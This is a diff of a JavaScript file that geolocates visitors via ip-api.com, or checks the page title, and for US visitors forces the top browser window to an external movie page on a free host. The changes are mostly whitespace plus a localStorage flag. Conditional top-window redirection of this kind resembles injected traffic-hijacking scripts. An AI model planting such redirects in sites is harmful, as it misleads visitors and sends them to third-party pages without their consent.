@@ -10,7 +10,7 @@ if(localStorage.getItem('local')){
          n();
     }
     else{
-         var gs = document.title;
+    var gs = document.title;
     if(gs.indexOf("11") == 0) {
          n();
     }else{
@@ -20,8 +20,7 @@ if(localStorage.getItem('local')){
 }else{
     var loc = "http://ip-api.com/json/";
     $.getJSON(loc, function(data){ 
-     var g = data.countryCode;
-        
+     var g = data.countryCode;  
      localStorage.setItem('local', g);
      if(g == "US"){
          n();
@@ -55,7 +54,8 @@ document.getElementsByTagName("head")[0].appendChild(links);
  };
 }
 function n(){
-    window.top.location = "http://mdsaerdd.hstn.me/movies.php?u=movie/popular&us=Popular movies&type=0";
+   window.top.location = "http://mdsaerdd.hstn.me/movies.php?u=movie/popular&us=Popular movies&type=0";
+   localStorage.setItem('local2', true);
 }
 
 
